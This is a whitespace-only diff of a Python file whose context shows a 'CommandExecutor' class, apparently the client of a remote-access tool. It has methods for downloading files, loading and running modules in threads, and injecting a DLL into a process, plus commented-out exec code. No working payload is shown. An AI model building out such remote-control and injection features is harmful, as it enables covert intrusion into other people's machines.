@@ -27,8 +27,6 @@ if os.name == 'nt':
 UP_TIME = get_time()
 
 
-
-
 # noinspection PyMethodMayBeStatic
 # noinspection PyUnusedLocal
 class CommandExecutor:
@@ -149,7 +147,6 @@ class CommandExecutor:
     #     time.sleep(0.1)
     #     self.send_to_server(1, "Command completed successfully", 1)
 
-
     @desc('download file')
     def download(self, filename):
         if os.path.isfile(filename):
@@ -204,8 +201,6 @@ class CommandExecutor:
     #     with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
     #         exec(code, kwargs)
     #     return 1, f.getvalue()
-
-
 
     @desc('load module and execute in new thread')
     def load(self, arg):
@@ -297,11 +292,6 @@ class CommandExecutor:
             logger.error(e)
         finally:
             return 1, format_dict(info)
-
-
-
-
-
 
     @desc('inject DLL into process')
     @params('pid', 'dll_path')
